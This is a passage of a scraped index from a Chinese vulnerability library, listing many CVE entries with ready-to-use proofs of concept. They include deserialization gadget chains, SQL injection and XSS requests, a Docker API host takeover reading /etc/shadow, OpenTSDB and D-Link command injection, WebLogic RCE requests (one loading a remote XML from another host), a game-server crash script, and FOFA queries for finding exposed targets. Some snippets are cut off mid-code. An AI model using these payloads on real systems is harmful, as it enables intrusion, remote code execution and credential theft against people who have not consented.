\\n\" + \" \\n\" + \" text/plain\\n\" + \" \\n\" + \" /tmp/CVE-2020-26259\\n\" + \" \\n\" + \" \\n\" + \" \\n\" + \" \\n\" + \" 0\\n\" + \" \\n\" + \" \\n\" + \" test\\n\" + \" \\n\" + \"\"; XStream xstream = new XStream(); xstream.fromXML(xml_poc); } } Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-26935 phpmyadmin后台SQL注入.html":{"url":"Edge_Security/CVE-2020-26935 phpmyadmin后台SQL注入.html","title":"CVE-2020-26935 phpmyadmin后台SQL注入","keywords":"","body":"CVE-2020-26935 phpmyadmin后台SQL注入 在4.9.6之前的phpMyAdmin和5.0.3之前的5.x的SearchController中发现一个问题。在phpMyAdmin如何处理搜索功能中的SQL语句中发现了一个SQL注入漏洞。攻击者可以利用此漏洞将恶意SQL注入查询。 Payload： http://127.0.0.1/tbl_zoom_select.php?db=pentest&table=a&get_data_row=1&where_clause=updatexml(1,concat(0x7e,user()),1) Reference https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26935 via：copy@xianzhi from：https://xz.aliyun.com/t/8524 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-27131 Cisco Security Manager 反序列化RCE.html":{"url":"Edge_Security/CVE-2020-27131 Cisco Security Manager 反序列化RCE.html","title":"CVE-2020-27131 Cisco Security Manager 反序列化RCE","keywords":"","body":"CVE-2020-27131 Cisco Security Manager 反序列化RCE 思科安全管理器是一个企业级安全管理应用程序，可提供对思科安全和网络设备的了解和控制。Cisco Security Manager在广泛的Cisco安全设备中提供全面的安全管理（配置和事件管理），包括Cisco ASA自适应安全设备，Cisco IPS系列传感器设备，Cisco集成服务路由器（ISR），Cisco防火墙服务模块（FWSM） ，Cisco Catalyst，Cisco交换机等等。Cisco Security Manager允许您有效地管理各种规模的网络-从小型网络到包含数百台设备的大型网络。 多个预身份验证漏洞已于2020-07-13提交给思科，并且（根据思科）已于2020-11-10在4.22版中进行了修补。发行说明未提及有关漏洞的任何信息，也未发布安全公告。所有有效负载均在NT AUTHORITY \\ SYSTEM上下文中进行处理。 PoC： import java.security.InvalidKeyException; import java.util.Base64; import com.cisco.nm.cmf.security.jaas.BlobCrypt; public class JaasEncryptor { public static void main(String args[]) { String b64Payload = \"rO0ABXN9AAAAAQAaamF2YS5ybWkucmVnaXN0cnkuUmVnaXN0cnl4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcgAtamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdEludm9jYXRpb25IYW5kbGVyAAAAAAAAAAICAAB4cgAcamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdNNhtJEMYTMeAwAAeHB3MQAKVW5pY2FzdFJlZgAIMTAuMC4wLjIAAAG7AAAAAEBnvkQAAAAAAAAAAAAAAAAAAAB4\"; byte[] payload = Base64.getDecoder().decode(b64Payload); byte[] key = new byte[]{-100, 76, -23, 87, 125, 0, 5, 94, 12, 76, 37, -84, 36, 78, 123, 5}; byte[] enc = BlobCrypt.encryptArray(payload, key); System.out.println(\"Encrypted payload: \" + Base64.getEncoder().encodeToString(enc)); byte[] dec = BlobCrypt.decryptArray(enc, key); } } ref： https://gist.github.com/Frycos/8bf5c125d720b3504b4f28a1126e509e#file-csm_pocs-md https://forum.ywhack.com/thread-114711-1-4.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-27533 DedeCMS v.5.8搜索功能 \"keyword\"参数XSS漏洞 PoC.html":{"url":"Edge_Security/CVE-2020-27533 DedeCMS v.5.8搜索功能 \"keyword\"参数XSS漏洞 PoC.html","title":"CVE-2020-27533 DedeCMS v.5.8搜索功能 \"keyword\"参数XSS漏洞 PoC","keywords":"","body":"CVE-2020-27533 DedeCMS v.5.8搜索功能 \"keyword\"参数XSS漏洞 PoC 描述： 在DedeCMS v.5.8的搜索功能中 \"keyword\"参数参数发现了跨站点脚本（XSS）问题，该问题使恶意用户可以将代码注入到网页中，并且其他用户在查看网页时也会受到影响。 PoC : POST /DedeCMSv5-master/src/dede/action_search.php HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 47 Origin: http://127.0.0.1 Connection: close Referer: http://127.0.0.1/DedeCMSv5-master/src/dede/ Cookie: menuitems=1_1%2C2_1%2C3_1; PHPSESSID=dgj9gs48q9nbrckdq0ei5grjd7; _csrf_name_7ac3ea0e=8a824367d97bb8f984d4af7a1ad11308; _csrf_name_7ac3ea0e__ckMd5=c692dd4f707ea756; DedeUserID=1; DedeUserID__ckMd5=7e44b1ee92d784aa; DedeLoginTime=1603530632; DedeLoginTime__ckMd5=69967c5a8db15fb4; dede_csrf_token=80866e4429220e784f2514d38de9a5ea; dede_csrf_token__ckMd5=de396c60d5d75d93 Upgrade-Insecure-Requests: 1 keyword=\">alert(1) https://www.exploit-db.com/exploits/48974 https://forum.ywhack.com/thread-114662-1-5.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-27986 SonarQube api 未授权访问.html":{"url":"Edge_Security/CVE-2020-27986 SonarQube api 未授权访问.html","title":"CVE-2020-27986 SonarQube api 未授权访问","keywords":"","body":"CVE-2020-27986 SonarQube api 未授权访问 SonarQube配置不当造成未授权访问，可以通过api/settings/values获取明文SMTP、SVN和Gitlab等敏感信息 PoC： http://[server]/api/settings/values ref： https://csl.com.co/sonarqube-auditando-al-auditor-parte-i/ https://forum.ywhack.com/thread-114647-1-6.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-29133 Coremail 存储型XSS.html":{"url":"Edge_Security/CVE-2020-29133 Coremail 存储型XSS.html","title":"CVE-2020-29133 Coremail 存储型XSS","keywords":"","body":"CVE-2020-29133 Coremail 存储型XSS PoC： coremail/XT5/jsp/upload.jsp 上传 1.jpg.html 获取对应的hashId获取到对应的地址 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-29564 Consul Docker images 空密码登录漏洞.html":{"url":"Edge_Security/CVE-2020-29564 Consul Docker images 空密码登录漏洞.html","title":"CVE-2020-29564 Consul Docker images 空密码登录漏洞","keywords":"","body":"CVE-2020-29564 Consul Docker images 空密码登录漏洞 Consul Docker images 0.7.1至1.4.2版本部署的Consul Docker容器的系统，可能允许远程攻击者使用空白密码来实现root用户访问。 PoC: docker -H :2375 run --rm -it --privileged --net=host -v /:/mnt alpine File Access: cat /mnt/etc/shadow RCE: chroot /mnt FOFA: port=\"2375\" && protocol==\"docker\" ref： https://forum.ywhack.com/thread-114824-1-2.html https://github.com/koharin/koharin2/blob/main/CVE-2020-29564 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-35476 OpenTSDB 2.4.0 远程代码执行.html":{"url":"Edge_Security/CVE-2020-35476 OpenTSDB 2.4.0 远程代码执行.html","title":"CVE-2020-35476 OpenTSDB 2.4.0 远程代码执行","keywords":"","body":"CVE-2020-35476 OpenTSDB 2.4.0 远程代码执行 在OpenTSDB 2.4.0及更低版本中yrange参数发现了一个远程执行代码漏洞（其他参数可能也容易受到攻击）。 fofa：title=\"Opentsdb\" ||body=\"opentsdb_header.jpg\" 在 CVE-2018-12972 用 反引号 来进行命令注入，o=%60ls%60 官方引入如下函数来过滤，现在可以重新被绕过。 // TODO - far from perfect, should help a little. if *(given.contains(\"`\") || given.contains(\"%60\") || given.contains(\"&#96;\")) *{ throw new BadRequestException(\"Parameter \" + param + \" contained a \" + \"back-tick. That's a no-no.\"); } /src/tsd/GraphHandler.java： private static String popParam(final Map> querystring, final String param) { final List params = querystring.remove(param); if (params == null) { return null; } final String given = params.get(params.size() - 1); // TODO - far from perfect, should help a little. if *(given.contains(\"`\") || given.contains(\"%60\") || given.contains(\"&#96;\")) *{ throw new BadRequestException(\"Parameter \" + param + \" contained a \" + \"back-tick. That's a no-no.\"); } return given; } Bypass Payload: [33:system('touch/tmp/poc.txt')] PoC： http://opentsdbhost.local/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('touch/tmp/poc.txt')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json OpenTSDB在temp目录中创建的gnuplot文件如下所示： set term png small size 1516,644 set xdata time set timefmt \"%s\" if (GPVAL_VERSION 当OpenTSDB执行mygnuplot.sh的时候poc.txt文件将被写入到临时目录。 ref： https://github.com/OpenTSDB/opentsdb/issues/2051 https://xz.aliyun.com/t/2511 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35476 https://forum.ywhack.com/thread-114835-1-2.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-36179〜82 Jackson-databind SSRF＆RCE.html":{"url":"Edge_Security/CVE-2020-36179〜82 Jackson-databind SSRF＆RCE.html","title":"CVE-2020-36179〜82 Jackson-databind SSRF＆RCE","keywords":"","body":"CVE-2020-36179〜82 Jackson-databind SSRF＆RCE CVE-2020-36179: CVE-2020-36180 CVE-2020-36181 CVE-2020-36182 RCE： PoC Github：https://github.com/Al1ex/CVE-2020-36179 本地复现成功： ref： https://forum.ywhack.com/thread-114949-1-1.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-6019 Valve Game Networking Sockets 安全漏洞.html":{"url":"Edge_Security/CVE-2020-6019 Valve Game Networking Sockets 安全漏洞.html","title":"CVE-2020-6019 Valve Game Networking Sockets 安全漏洞","keywords":"","body":"CVE-2020-6019 Valve Game Networking Sockets 安全漏洞 Valvesoftware ValveSoftware GameNetworkingSockets是美国维尔福（Valvesoftware）公司的一个用于游戏传递数据的传输层支持软件。 Valves Game Networking Sockets v1.2.0之前版本存在安全漏洞，该漏洞源于在函数CConnectionTransportUDPBase：：Received Data()中不正确地处理内联统计消息，导致libprotobuf抛出异常并导致崩溃。 文件：steamnetworkingsockets\\clientlib\\steamnetworkingsockets_udp.cpp 函数：CConnectionTransportUDPBase::Received_Data() 连接协议支持作为传入消息头的一部分传输统计数据。 在准备解析protobuf编码的统计blob时，边界检查中有一个32位溢出： pIn = DeserializeVarInt( pIn, pPktEnd, cbStatsMsgIn ); if ( pIn == NULL ) { ReportBadUDPPacketFromConnectionPeer( \"DataPacket\", \"Failed to varint decode size of stats blob\" ); return; } // EI-DBG: Classic 32-bit overflow, and it turns out that CS:GO is 32bits (client & server). // EI-DBG: Will lead to an error and raised exception in the ParseFromArray() method if ( pIn + cbStatsMsgIn > pPktEnd ) { ReportBadUDPPacketFromConnectionPeer( \"DataPacket\", \"stats message size doesn't make sense. Stats message size %d, packet size %d\", cbStatsMsgIn, cbPkt ); return; } if ( !msgStats.ParseFromArray( pIn, cbStatsMsgIn ) ) { ReportBadUDPPacketFromConnectionPeer( \"DataPacket\", \"protobuf failed to parse inline stats message\" ); return; } CVE_2020_6019_PoC_32_bits.py： #/usr/bin/python3 from elementals import Prompter import logging import sys import socket import struct import steam_networking_sockets #################### # Config Variables # #################### VULNERABILITY_ID = \"CVE-2020-6019 - 32 bits\" VULNERABILITY_DESC = \"Exception raised when handling large 32-bit length field for incoming stats\" ENCRYPTION_TYPE = True #################### # Global Variables # #################### logger = None ## # Trigger the vulnerability ## def startExploit(socket_fd): # build a protobuf blob to cause a 32-bit overflow blob = bytes() # Varint for the stats length # Saw the protobuf raise the exception for it wanted_length = 2 ** 32 - 0x4 while wanted_length > 0: next_value = wanted_length >> 7 blob += struct.pack(\"B\", (wanted_length & 0x7F) | (0x80 if next_value != 0 else 0x00)) wanted_length = next_value # Unused length-delimited field to be \"skipped\" so to cause protobuf to complain about the negative size blob += struct.pack(\"B\", (5 0: next_value = wanted_length >> 7 blob += struct.pack(\"B\", (wanted_length & 0x7F) | (0x80 if next_value != 0 else 0x00)) wanted_length = next_value # we don't really need a message msg = bytes() steam_networking_sockets.connectionSend(socket_fd, msg, protobuf=blob) ## # Prints the usage instructions ## def printUsage(args): print(f\"Usage: {args[0]} \") print(\"Exiting\") exit(1) ## # Main function (example) ## def main(args): global logger # Check the arguments if len(args) != 1 + 2: print(f\"Wrong amount of arguments, got {len(args) - 1}, expected 2.\") printUsage(args) # parse the args server_ip = args[1] server_port = int(args[2]) # open the log logger = Prompter(f\"Exploit PoC - {VULNERABILITY_ID}\", [(\"exploit_poc.log\", \"w\", logging.DEBUG)], min_log_level=logging.DEBUG) logger.info(\"Starting the exploit PoC:\") logger.addIndent() logger.info(VULNERABILITY_ID) logger.info(VULNERABILITY_DESC) logger.removeIndent() # create a Steam Sockets connection socket_fd = steam_networking_sockets.createSteamConnection(server_ip, server_port, ENCRYPTION_TYPE, logger) # start the attack startExploit(socket_fd) logger.info(\"Finished Successfully\") if __name__ == \"__main__\": main(sys.argv) ref： https://cpr-zero.checkpoint.com/vulns/cprid-2161/ https://www.anquanke.com/vul/id/2235460 https://forum.ywhack.com/thread-114798-1-3.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-6308 SAP POC.html":{"url":"Edge_Security/CVE-2020-6308 SAP POC.html","title":"CVE 2020 6308 SAP POC","keywords":"","body":"CVE-2020-6308 SAP POC SAP BusinessObjects Business Intelligence平台（Web服务）版本-410、420、430允许未经身份验证的攻击者注入任意值作为CMS参数，以在内部网络上执行查找，否则将无法从外部访问该内部网络。成功利用后，攻击者可以扫描内部网络以确定内部基础结构，并收集信息以进行进一步的攻击，例如远程文件包含，检索服务器文件，绕过防火墙并迫使易受攻击的服务器执行恶意请求，从而导致服务器端请求伪造漏洞。 详情参考：https://github.com/InitRoot/CVE-2020-6308-PoC PoC： POST /AdminTools/querybuilder/logon?framework= HTTP/1.1 Host: 192.168.0.191:8080 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 128 Origin: http://192.168.0.191:8080 Connection: close Referer: http://192.168.0.191:8080/AdminTools/querybuilder/ie.jsp Upgrade-Insecure-Requests: 1 aps=192.168.0.191&usr=admin&pwd=admin&aut=secEnterprise&main_page=ie.jsp&new_pass_page=newpwdform.jsp&exit_page=logonform.jsp Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-8255 Pulse Connect Secure通过登录消息组件实现任意文件读取.html":{"url":"Edge_Security/CVE-2020-8255 Pulse Connect Secure通过登录消息组件实现任意文件读取.html","title":"CVE-2020-8255 Pulse Connect Secure通过登录消息组件实现任意文件读取","keywords":"","body":"CVE-2020-8255 Pulse Connect Secure通过登录消息组件实现任意文件读取 概述： Pulse Connect Secure在登录前/后消息组件中存在任意文件读取漏洞。经过身份验证的管理用户可以利用此漏洞从底层操作系统读取任意文件。 PoC： 首先创建en.txt和default.txt文件： ln -s /etc/passwd default.txt ln -s /etc/passwd en.txt 使用--symlinks选项压缩文件： zip --symlinks logon.zip default.txt en.txt adding: default.txt (stored 0%) adding: en.txt (stored 0%) 通过/dana-admin/auth/signinNotif.cgi页面上传zip包，最后通过/dana-admin/auth/signinPolicy.cgi触发任意文件读取。 ref： https://research.nccgroup.com/2020/10/26/technical-advisory-pulse-connect-secure-arbitrary-file-read-via-logon-message-cve-2020-8255/ https://forum.ywhack.com/thread-114616-1-6.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-8277：Node.js通过DNS请求实现拒绝服务.html":{"url":"Edge_Security/CVE-2020-8277：Node.js通过DNS请求实现拒绝服务.html","title":"CVE-2020-8277：Node.js通过DNS请求实现拒绝服务","keywords":"","body":"CVE-2020-8277：Node.js通过DNS请求实现拒绝服务 近日，Node.js官方发布最新安全版本公告，披露在v12.x，v14.x和v15.x 相应的Node.js版本中存在一处高风险的拒绝服务漏洞(CVE-2020-8277)。受影响的Node.js应用允许攻击者对目标主机发送DNS请求，利用Node.js应用解析大量响应的DNS记录来对目标主机实现拒绝服务攻击。 影响版本： Node.js 12.x: 12.16.3-12.19.1 Node.js 14.x: 14.13.0-14.15.1 Node.js 15.x全部版本 Quick Run： # clone this repository $ git clone https://github.com/masahiro331/CVE-2020-8277 # run bind $ docker build -t bind-local ./bind # Need TCP fallback $ docker run --rm --name bind -it -p 53:53 -p 53:53/udp bind # use \" main.js： // const SegfaultHandler = require('segfault-handler'); // SegfaultHandler.registerHandler('crash.log'); const { Resolver } = require('dns'); const resolver = new Resolver(); resolver.setServers(['127.0.0.1']); x = 0 resolver.resolve4('safe.masahiro331.com', (err, addresses) => { while (x ref： https://github.com/masahiro331/CVE-2020-8277 https://www.safedog.cn/news.html?id=4599 https://forum.ywhack.com/thread-114728-1-4.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020–14882 Weblogic 未经授权绕过RCE.html":{"url":"Edge_Security/CVE-2020–14882 Weblogic 未经授权绕过RCE.html","title":"CVE-2020–14882 Weblogic 未经授权绕过RCE","keywords":"","body":"CVE-2020–14882 Weblogic 未经授权绕过RCE ShellSession coherence-rest.jar#com.tangosol.coherence.mvel2.sh.ShellSession Payload： POST /console/images/%252E%252E%252Fconsole.portal HTTP/1.1 Host: 172.16.242.134:7001 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 117 _nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime('calc.exe');\"); Getshell ROOT_PATH= C:\\Oracle\\Middleware\\Oracle_Home\\user_projects\\domains\\base_domain\\ Shell_path= ../../../wlserver/server/lib/consoleapp/webapp/images/xxx.jsp weblogic 12 GET /console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22); HTTP/1.1 Host: 192.168.3.189:7001 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: ADM Upgrade-Insecure-Requests: 1 weblogic 10 GET /console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(\"http://192.168.8.142/poc.xml); HTTP/1.1 Host: 192.168.3.189:7001 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: ADM Upgrade-Insecure-Requests: 1 poc.xml： sh -c Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020–24723 存储XSS的故事导致管理帐户接管.html":{"url":"Edge_Security/CVE-2020–24723 存储XSS的故事导致管理帐户接管.html","title":"CVE-2020–24723 存储XSS的故事导致管理帐户接管","keywords":"","body":"CVE-2020–24723 存储XSS的故事导致管理帐户接管 CVE:https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-24723 Exploit Title: User Registration & Login and User Management System 2.1— Stored Cross-Site Scripting 此漏洞可能导致攻击者在用户注册注入XSS Padylod，每次管理员从管理面板访问管理用户部分时，XSS触发器和攻击者可以根据精心制作的Payload窃取cookie。 漏洞参数：Last Name 复现步骤： 1,访问注册页面 2,填写详细信息，将XSS Padyload alert(“XSS”)放入名字，姓氏。 3,访问管理面板。可以看到我们的有效载荷被执行。 ref： https://medium.com/bugbountywriteup/cve-2020-24723-89ea76588286 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020–4280 — IBM QRadar Java反序列化分析和绕过.html":{"url":"Edge_Security/CVE-2020–4280 — IBM QRadar Java反序列化分析和绕过.html","title":"CVE-2020–4280 — IBM QRadar Java反序列化分析和绕过","keywords":"","body":"CVE-2020–4280 — IBM QRadar Java反序列化分析和绕过 周，国外安全研究员发布了一个IBM Qradar SIEM Java Deser漏洞。 CVE编号：CVE-2020–4280 (详情) Qradar不仅有企业版，同时也具有社区版。 可以从这里下载：https://developer.ibm.com/qradar/ce/，目前只有Community Edition版本7.3.3，而Enterprise Edition当前正在使用7.4.1版本。登录后，将下载一个ova文件，以导入到VMWare/Virtual Box中。 安装过程可以参考：https://kifarunix.com/how-to-install-ibm-qradar-ce-v7-3-1-on- 作者使用的poc： 在作者的原始PoC中，有一个比较麻烦的句柄： 使用Jython1小工具启用console.enableExecuteCommand- >属性，然后调用Qradar.executeCommand（）。 另一种方法可以更简洁地处理，即使用定制版本的ROME小工具执行并响应正文，PoC结果如下： Bypass CVE-2020–4280： ref： https://testbnull.medium.com/cve-2020-4280-ibm-qradar-java-deserialization-anlysis-and-bypass-c3fe57207057 https://www.securify.nl/advisory/java-deserialization-vulnerability-in-qradar-remotejavascript-servlet https://forum.ywhack.com/thread-114654-1-5.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2021-1791 Fairplay OOB Read POC.html":{"url":"Edge_Security/CVE-2021-1791 Fairplay OOB Read POC.html","title":"CVE 2021 1791 Fairplay OOB Read POC","keywords":"","body":"CVE-2021-1791 Fairplay OOB Read POC 越界读取问题，导致内存泄漏. 影响版本：macOS Big Sur 11.0.1 fairplay_iokit_uc_run_versioned.c: #include #include #include #include #include #include void hexdump(void *ptr, int buflen) { unsigned char *buf = (unsigned char*)ptr; int i, j; for (i=0; ifield_0 = 0x00000008; sIn->field_4 = 0x525e5ba4; sIn->field_8 = 0x34788a7a; sIn->size = 0x70; memcpy(sIn->sec1,sec1,20); memcpy(sIn->sec2,sec2,sIn->size); //magic sIn->size = 0xdeadbeef; if(fairplay_run_versioned(conn,sIn,sOut)){ return -1; } printf(\"outSec1 : \\n\"); hexdump(sOut->sec1,20); printf(\"outSec2 : \\n\"); hexdump(sOut->sec2,sOut->size); printf(\"[+] fairplay success, size = %d, ret = %d\\n\",sOut->size,sOut->fp_ret); } ref： https://support.apple.com/en-us/HT212147 https://gist.github.com/pwn0rz/e34ab9f6e46956621a9d4f98cf222320 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2021-3007 zend framework3 反序列化 rce.html":{"url":"Edge_Security/CVE-2021-3007 zend framework3 反序列化 rce.html","title":"CVE-2021-3007 zend framework3 反序列化 rce","keywords":"","body":"CVE-2021-3007 zend framework3 反序列化 rce 详细分析：https://github.com/Ling-Yizhou/zendframework3-/blob/main/zend%20framework3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20rce.md PoC1: streamName = $streamName; } } } namespace Zend\\View\\Helper{ class Gravatar{ protected $view; // protected $attributes = [\"whoami\"=>'a']; protected $attributes = [1=>'a']; public function __construct($view) { $this->view=$view; } } } namespace Zend\\View\\Renderer{ class PhpRenderer{ private $__helpers; public function __construct($__helpers) { $this->__helpers = $__helpers; } } } namespace Zend\\Config{ class ReaderPluginManager{ protected $services; protected $instanceOf =\"Zend\\Validator\\Callback\"; public function __construct($services){ $this->services = [\"escapehtml\"=>$services,\"escapehtmlattr\"=>$services]; } } } namespace Zend\\Validator{ class Callback{ protected $options = [ 'callback' => 'phpinfo', 'callbackOptions' => [] ]; } } namespace { $e = new Zend\\Validator\\Callback(); $d = new Zend\\Config\\ReaderPluginManager($e); $c = new Zend\\View\\Renderer\\PhpRenderer($d); $b = new Zend\\View\\Helper\\Gravatar($c); $a = new Zend\\Http\\Response\\Stream($b); echo base64_encode(serialize($a)); } PoC2: streamName = $streamName; } } } namespace Zend\\View\\Helper{ class Gravatar{ protected $view; // protected $attributes = [\"whoami\"=>'a']; protected $attributes = ['whoami'=>1]; public function __construct($view) { $this->view=$view; } } } namespace Zend\\View\\Renderer{ class PhpRenderer{ private $__helpers; public function __construct($__helpers) { $this->__helpers = $__helpers; } } } namespace Zend\\Config{ class Config{ protected $data = [ \"escapehtml\"=>'system', \"escapehtmlattr\"=>'phpinfo' ]; } } namespace { $d = new Zend\\Config\\Config(); $c = new Zend\\View\\Renderer\\PhpRenderer($d); $b = new Zend\\View\\Helper\\Gravatar($c); $a = new Zend\\Http\\Response\\Stream($b); echo base64_encode(serialize($a)); } Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/D-Link DCS系列监控 账号密码信息泄露 CVE-2020-25078.html":{"url":"Edge_Security/D-Link DCS系列监控 账号密码信息泄露 CVE-2020-25078.html","title":"D-Link DCS系列监控 账号密码信息泄露 CVE-2020-25078","keywords":"","body":"D-Link DCS系列监控 账号密码信息泄露 CVE-2020-25078 D-Link DCS系列监控 通过访问特定的URL得到账号密码信息，攻击者通过漏洞进入后台可以获取视频监控页面。 FOFA： app=\"D_Link-DCS-2530L\" 影响版本： DCS-2530L DCS-2670L DCS-4603 DCS-4622 等多个DCS系列系统 PoC： http://xxx.xxx.xxx.xxx/config/getuser?index=0 ref: https://mp.weixin.qq.com/s/b7jyA5sylkDNauQbwZKvBg Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/D-LINK DIR-802 命令注入漏洞（CVE-2021-29379）.html":{"url":"Edge_Security/D-LINK DIR-802 命令注入漏洞（CVE-2021-29379）.html","title":"D-LINK DIR-802 命令注入漏洞（CVE-2021-29379）","keywords":"","body":"D-LINK DIR-802 命令注入漏洞（CVE-2021-29379） DIR-802中存在一个命令注入漏洞，攻击者可以通过精心制作的M-SEARCH数据包向UPnP注入任意命令。 受影响设备及软件版本 DIR-802 hardware revision Ax before v1.00b05 PoC： # coding: utf-8 import socket import struct buf = 'M-SEARCH * HTTP/1.1\\r\\nHOST:192.168.0.1:1900\\r\\nST:urn:schemas-upnp-org:service s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) s.connect((\"192.168.0.1\", 1900)) s.send(buf) s.close() ref： https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29379 https://cool-y.github.io/2021/03/02/DIR-802-OS-Command-Injection/ Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/D-LINK DIR-841 命令注入（CVE-2021-28143）.html":{"url":"Edge_Security/D-LINK DIR-841 命令注入（CVE-2021-28143）.html","title":"D-LINK DIR-841 命令注入（CVE-2021-28143）","keywords":"","body":"D-LINK DIR-841 命令注入（CVE-2021-28143） D-Link DIR-841 3.03和3.04 存在经过身份验证的命令注入，通过“系统工具”（ping/ping6/traceroute）命令注入，可导致攻击者进行完全控制设备。 PoC： POST /jsonrpc HTTP/1.1 Host: IP User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0 Accept: application/json, text/plain, */* Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/json;charset=utf-8 Authorization: Digest username=\"admin\", realm=\"domain\", nonce=\"4784226\", uri=\"/jsonrpc\", response=\"84799b55020cf2c53e28214e3d60b899\", qop=auth, nc=00000035, cnonce=\"bPzBB3mcvSb51Ijx\" Content-Length: 156 Origin: IP Connection: close Referer: http://ip-address:9821/admin/index.html Cookie: user_ip=0.0.0.0; device_mode=router; user_login=admin; device-session-id= {\"jsonrpc\":\"2.0\",\"method\":\"write\",\"params\":{\"id\":166,\"data\":{\"host\":\"'127.0.0.1 & sleep 5'\",\"count\":1,\"is_ipv6\":false,\"max_ttl\":30,\"nqueries\":2,\"waittime\":3},\"save\":true},\"id\":757} Exfiltrating files POST /jsonrpc HTTP/1.1 Host: IP User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0 Accept: application/json, text/plain, */* Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/json;charset=utf-8 Authorization: Digest username=\"admin\", realm=\"domain\", nonce=\"4784226\", uri=\"/jsonrpc\", response=\"84799b55020cf2c53e28214e3d60b899\", 